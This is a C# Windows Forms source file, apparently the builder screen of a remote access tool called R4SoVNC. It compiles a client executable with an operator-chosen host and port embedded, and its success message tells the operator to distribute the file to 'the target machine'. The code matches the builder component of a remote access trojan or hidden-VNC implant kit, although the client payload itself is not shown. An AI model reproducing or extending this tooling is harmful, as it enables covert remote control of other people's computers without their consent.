using System;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using R4SoVNC.Server.Builder;
using R4SoVNC.Server.Helpers;

namespace R4SoVNC.Server.Forms
{
    public partial class BuilderForm : Form
    {
        private CancellationTokenSource? _cts;

        public BuilderForm()
        {
            InitializeComponent();
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            string host      = txtHost.Text.Trim();
            string portStr   = txtPort.Text.Trim();
            string exeName   = txtOutputName.Text.Trim();

            if (string.IsNullOrEmpty(host))
            { ShowError("Please enter the server host / IP address."); return; }

            if (!int.TryParse(portStr, out int port) || port < 1 || port > 65535)
            { ShowError("Please enter a valid port number (1–65535)."); return; }

            if (string.IsNullOrEmpty(exeName))
            { ShowError("Please enter an output file name."); return; }

            if (!exeName.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
                exeName += ".exe";

            string outputDir = Path.Combine(
                Path.GetDirectoryName(Application.ExecutablePath)!,
                "Builds");

            StartBuild(host, port, exeName, outputDir);
        }

        private void StartBuild(string host, int port, string exeName, string outputDir)
        {
            btnBuild.Enabled    = false;
            btnCancel.Enabled   = true;
            pnlProgress.Visible = true;
            lblBuildStatus.Text = "Preparing...";
            lblBuildStatus.ForeColor = Theme.Accent;

            _cts = new CancellationTokenSource();
            var token = _cts.Token;

            Task.Run(() =>
            {
                var result = ClientCompiler.Compile(
                    host, port, outputDir,
                    progress => Invoke(() => lblBuildStatus.Text = progress),
                    token);

                Invoke(() => OnBuildComplete(result, exeName, outputDir));
            }, token);
        }

        private void OnBuildComplete(ClientCompiler.CompileResult result,
                                     string exeName, string outputDir)
        {
            btnBuild.Enabled    = true;
            btnCancel.Enabled   = false;
            pnlProgress.Visible = false;
            _cts?.Dispose();
            _cts = null;

            if (result.Success)
            {
                // Rename to the user-chosen filename
                string finalPath = Path.Combine(outputDir, exeName);
                if (result.ExePath != finalPath && File.Exists(result.ExePath))
                {
                    File.Copy(result.ExePath, finalPath, overwrite: true);
                    File.Delete(result.ExePath);
                }

                lblBuildStatus.Text      = "Build successful!";
                lblBuildStatus.ForeColor = Theme.Success;

                MessageBox.Show(
                    $"Client built successfully!\n\n" +
                    $"Host: {txtHost.Text.Trim()}\n" +
                    $"Port: {txtPort.Text.Trim()}\n\n" +
                    $"Output: {finalPath}\n\n" +
                    "Distribute this self-contained .exe to the target machine.",
                    "Build Complete", MessageBoxButtons.OK, MessageBoxIcon.Information);

                if (chkOpenFolder.Checked)
                    System.Diagnostics.Process.Start("explorer.exe", outputDir);
            }
            else
            {
                lblBuildStatus.Text      = "Build failed.";
                lblBuildStatus.ForeColor = Theme.Danger;

                MessageBox.Show(
                    $"Build failed:\n\n{result.ErrorMessage}",
                    "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void btnCancel_Click(object sender, EventArgs e)
        {
            _cts?.Cancel();
            lblBuildStatus.Text      = "Cancelling...";
            lblBuildStatus.ForeColor = Theme.Warning;
            btnCancel.Enabled = false;
        }

        private void btnBrowseOutput_Click(object sender, EventArgs e)
        {
            using var sfd = new SaveFileDialog
            {
                Title    = "Save Client Executable",
                Filter   = "Executable|*.exe",
                FileName = txtOutputName.Text
            };
            if (sfd.ShowDialog() == DialogResult.OK)
                txtOutputName.Text = Path.GetFileName(sfd.FileName);
        }

        private static void ShowError(string msg) =>
            MessageBox.Show(msg, "Validation Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
    }
}
